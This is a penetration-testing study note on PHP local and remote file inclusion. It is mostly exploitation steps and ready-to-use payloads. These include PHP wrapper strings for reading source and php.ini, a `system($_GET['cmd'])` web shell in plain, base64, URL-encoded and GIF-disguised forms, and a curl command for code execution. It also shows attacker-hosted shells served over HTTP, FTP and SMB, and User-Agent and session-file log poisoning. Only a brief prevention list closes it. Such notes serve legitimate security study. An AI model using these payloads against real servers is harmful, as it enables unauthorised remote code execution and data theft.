### General Notes

Web applications use [[HTTP]] parameters to dynamically build their pages by specifying the resources they want shown.
- The functions that are responsible for taking in the parameters and then displaying the files required need to be securely coded.

Attackers can exploit these functions by manipulating the parameter values to display the content of whatever *local file on the server*. 

This type of attack is most common in web applications that use **templating engines**, a software that defines a template for a website by keeping the footer, header, and navbar constant.
- The content of the page is then loaded into that template, also called the data.
- This is sometimes done by specifying a parameter that points to the specific file to be displayed: `/index.php?page=about`.
- Another example is pages that load different languages based on a parameter.

> File inclusion vulnerabilities help in source code disclosure, [[Information Disclosure]], and possibly remote code execution. 

The idea to exploit is to look for input parameters, and test them, as their backend functions could be simply taking the values passed without any sanitization. For example: 
- `include($_GET['param'])` in `php`, where the value of the `param` query parameter is taken.

> The query parameters used here are after the `?` character. however, if the payload is already inserted into a query parameter, then they should be placed after the `&` character.

---
### Automating the Process of Finding and Exploiting

Use automation tools to find endpoints to attack, such as fuzzing with [[ffuf]] to find hidden parameters for example. ([[ffuf#5. Parameters]])
- After finding an endpoint, use a wordlist to try all the famous payloads. A good wordlist to use is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).
- This wordlist can be used to obtain any of the important paths discussed below.
###### Server Webroot Path
An important location that needs to be known is the **server Webroot** path, or the root directory of the web application.
- This path is useful in finding other files on the application, such as the `uploads` directory if we want to include a file that we uploaded.
- This can be done by fuzzing for the `index.php` file using this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) while adding a few `../` back directories to the path: `ffuf -u http://page?language=../../../../../FUZZ/index.php`. 

###### Tools

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).
- Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution

---
### Local File Inclusion (LFI)

Identify injection points where attacker input can change the data being displayed to reveal files.
- Using techniques from the [[Directory Traversal]] note, attackers can bypass defenses that are put in place to protect against file inclusion vulnerabilities.
- Check out also [[Command Injection]] note for more complex techniques to bypass filters.

#### Using PHP Wrappers

`PHP` wrappers are special stream wrappers that allow `PHP` to interact with various types of data streams, such as files, URLs, or even custom [[Protocol]]s, in a consistent and unified way.
###### Filter Wrapper

This takes input and filters it in a defined manner by the type of filter used.
- The `filter` wrapper has 2 important parameters, which are `resource` and `read`, that define how to apply the filter and the resource file to be applied on.

The base64 conversion filter is useful in disclosing source code, and it can be used by specifying the file name:
```url
php://filter/read=convert.base64-encode/resource=filename
```
- The filename can be discovered by using a fuzzing tool as part of [[Directory and File Enumeration]] with a *fixed* file type extension at the end of `.php`.

###### Data Wrapper

This can be used to include external data, such as `php` code.
- Can **only** be used if the `allow_url_include` setting is enabled in the configuration file.
- it is set to off by default, so check it before trying to exploit.

> The configuration file is found at `/etc/php/X.Y/apache2/php.ini` for Apache and `/etc/php/X.Y/fpm/php.ini` for Nginx, where `X.Y` is the `php` version.

To read the configuration file, we will use the `filter` wrapper with the base64 filter because the characters they contain can break the output stream:
```url
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```
- Try different versions starting from the latest and keep going for earlier versions.
- Base64 decode the output and find the setting for `allow_url_include`.

If it is set to on, then the `Data` wrapper can be used to upload data, in this case, a web shell is the winner.
- The data could be uploaded encoded as Base64:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

- Pass the output to the data wrapper, and pass the command to be executed as a `GET` request query parameter.
```url
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

> The Base64 encoded data is placed after `data://text/plain;base64,`

###### Input Wrapper

Similar to the `data` wrapper in uploading data, but it requires that the data to be uploaded be added as `POST` data.
- Also needs the `allow_url_include` configuration option to be set to on.

Since it requires a `POST` request, then using the [[cURL]] tool is required:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" 
```
- The command to be executed is passed as a `GET` query parameter called `cmd`.

> Instead of uploading an entire shell, we can execute single commands by simply changing the contents of the `system()` to include any command. This is the case if we cant pass `GET` parameters with the command itself.

###### Expect Wrapper

This wrapper allows for commands to be directly executed through the URL stream.
- This wrapper is an external one, so it needs to be installed. To check for its installation, check the configuration file similar to the above wrappers to see if it is installed.

To use it, simply pass the desired command in a LFI vulnerable endpoint:
```url
expect://command
```

#### Using File Uploads

Applications that allow users to upload files requires certain file types.
- For [[File Upload]] attacks, we try to target the upload functionality itself.
- Instead, attackers can upload any file, and then try to include that file through a vulnerable file inclusion function.
- The file uploaded can be of any type, but inside it will be stored `php` code for example that can be executed when called upon.

> The application needs to simply allow file uploads. The vulnerability isn't in the upload form, but in the file inclusion that could take place after the file has been uploaded. Given that the file uploaded has malicious content stored inside.

###### Image Upload

To upload images that are then included maliciously, we need to create an image that has stored inside it a `php` script.
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

> Now that the image has been uploaded, we need to find its location. We can do this by inspecting it and finding its URL. Another solution would be to use fuzzing for [[Directory and File Enumeration]] to try and locate its location.

After finding it, we can then head to the vulnerable LFI function and call on the "image" (our script) with a command using the query parameter `cmd`:
```url
./image/location&cmd=id
```
- Notice the `./` as we are running the file.
- Utilize [[Directory Traversal]] techniques to combat defenses placed against it.

---
### Remote File Inclusion (RFI)

This allows for the attacker to include remote files, not just the ones local to the server or machine.
- This allows us to include malicious scripts to enumerate and gather information, or deploy a web shell to gain code execution.

> Most of the time, a RFI vulnerability is a LFI vulnerability, but the opposite case is not true. This might be because the function doesn't allow remote files to be included, the entire file path is not under control (the protocol part can't be changed), or the web server prevents loading of remote files.

For this vulnerability to work, the `allow_url_include` option needs to be set to on in the configuration file.
- Check above in the PHP wrapper section on how to check. ([[#Data Wrapper]]).
- **NOT THE CASE FOR WINDOWS SERVERS.** Windows [[Server Message Block (SMB)]] servers can load remote files from other SMB servers without the `allow_url_include` option enabled, as they are treated as normal files that can be directly referenced.

Might also not work if it is set to on, so always try to include a URL and check if it works.
- Try first a local URL so the [[Firewall]] doesn't block it.
```URL
http://127.0.0.1:80/index.php
```

> Check if the included file was rendered as HTML, or if the file itself was executed in its native language. If it got executed, then there is a chance of this escalating to code execution.

#### Remote Code Execution

To obtain remote code execution, we need to host a script of a web shell such that the RFI vulnerability in the application can load that URL and include our malicious file.

> When hosting the script, make it on a common well known [[Port]] such as `80` or `443` as these ports can be whitelisted by the web application server and its firewall. Other ports might be closed for security reasons.

- The first step is crafting the shell code:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, to host this script such that the RFI vulnerable application can be able to reach and load the script.
- We can try various [[Protocol]]s because some might be closed or not working.
###### [[HTTP]] 

Using python `http.server` in the directory where the `shell.php` file exists.

```bash
sudo python3 -m http.server 80
```
- Now, exploiting the vulnerability, enter this URL to reach the `shell.php` file and pass the command using the `cmd` query parameter: `http://machine.ip:80/shell.php&cmd=id`.
- The `cmd` is placed after a `&` not `?` since this entire URL is a query parameter.

###### [[File Transfer Protocol (FTP)]]

Using python `pyftpdlib` library to start a simple FTP server.
- Useful if the HTTP ports are blocked, or if there is a web application firewall that combats RFI by blacklisting the `http://` string.

```bash
sudo python -m pyftpdlib -p 21
```
- To exploit it and run commands, we can enter this URL to reach the `shell.php` file and pass the command using the `cmd` query parameter: `ftp://machine.ip/shell.php?cmd=id`.

Since FTP requires authentication, it will first try running this command as the anonymous user.
- If that doesn't work, then we can pass credentials as follows:
```url
ftp://user:pass@machine.ip/shell.php&cmd=id
```
- The `cmd` is placed after a `&` not `?` since this entire URL is a query parameter.

###### [[Server Message Block (SMB)]]

Using python `impacket-smbserver` library to start an SMB server.
- Allows anonymous authentication.

```bash
impacket-smbserver -smb2support share $(pwd)
```
- To include a file, we need to use windows path format: `\\machine.ip\share\shell.php`.

> Will most likely work only if we are on the same network as the application, as accessing remote SMB servers is blocked by default.

---
### Log Poisoning

This technique of executing the file inclusion attack is conducted by writing PHP code into a user controllable field, and this user controlled input gets written to a **log file**.
- This log file is then included, and the PHP code is executed.

> The web application needs to have *read* permissions over the log files for this to work.

Log files are large, and loading these files can take time and resources, which can be harmful in production environments. **TAKE CARE**.

##### PHP Session Poisoning

PHP applications use the `PHPSESSID` [[Cookies]] which holds user related data to keep track of user information.
- This data is saved in `session` files in the back-end, such as `/var/lib/php/sessions` directory on Linux, and `C:\Windows\Temp\` directory on windows.

> The name of the user specific file is the same as the `PHPSESSID` cookie name with the `sess_` prefix.

To perform the attack, we check out the cookies and see if the cookie exists.
- If it does, we try to include the file with the name of the cookie after the following string: `/var/lib/php/sessions/sess_COOKIENAME`.

Including the file with this URL, we can check its content to see if it has anything we can control.
- Sometimes, it has a `page` variable that is set to the value of page the user visited, or for example, the value of another query parameter that decides which page the user visits.

After figuring out from where the `page` variable gets its value, we can place in it the PHP code that creates a web shell.
- One example is the URL encoded ([[Web Encoding]]) version of the web shell.
```url
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
- After placing that value in the parameter, we can then visit the session cookie file by including it and adding the `cmd` parameter with the command to be executed.
```
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

> To execute multiple commands, we have to again insert the value of the `page` parameter again, because its value gets reset after visiting a different page. The best practice is to write a permanent web shell in the file, or to create [[Reverse Shells]].

##### Server Log Poisoning

Servers keep logs, and these logs contain information about the requests made to the server.
- An important piece of information that gets logged with each request is the `User-Agent` header. 

> MUST USE SINGLE QOUTES, DOUBLE QUOTES BREAKS THE LOG FILE. The double quote gets escaped in the log file.

Since the `User-Agent` header can be controlled by us, we can insert a malicious payload and then use file inclusion vulnerability to load the log file, executing the commands.
- Inserting a common web shell script in the `User-Agent` header and then loading the log file that contains that malicious script will give us code execution on the application.

> Some important log files to note are `access.log` and `error.log`, which are stored in the Log directories, which change from server to server.

**Apache** servers store logs in the following directories:
- `/var/log/apache2/` in Linux systems.
- `C:\xampp\apache\logs\` in Windows systems.

**Nginx** servers store logs in the following directories:
- `/var/log/ngingx/` in Linux systems.
- `C:\nginx\log\` in Windows systems.

If they are not there, then try fuzzing for them.
- We can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) while also adding a few `../` back directories: `ffuf -u http://page?language=../../../../../FUZZ`

There are also other logs that can be poisoned:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. 
 - We can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. 
 
The main idea is to check if the log files can be read by us, as well as included.
- Once that is the case, try and put code that will achieve our goals in the logs.
- Then load the file to run that code.

---
### Prevention

1. Avoid passing user controlled input to any file inclusion functions or APIs.
	- If that is hard, then use whitelists.
2. Prevent Directory Traversal attacks by using functions that pull out only the filename from user input.
	- This includes adding recursive cleaners.
3. Properly configure servers to close off any dangerous functions or options such as the `allow_url_include`.
4. Use Web Application Firewalls.

---
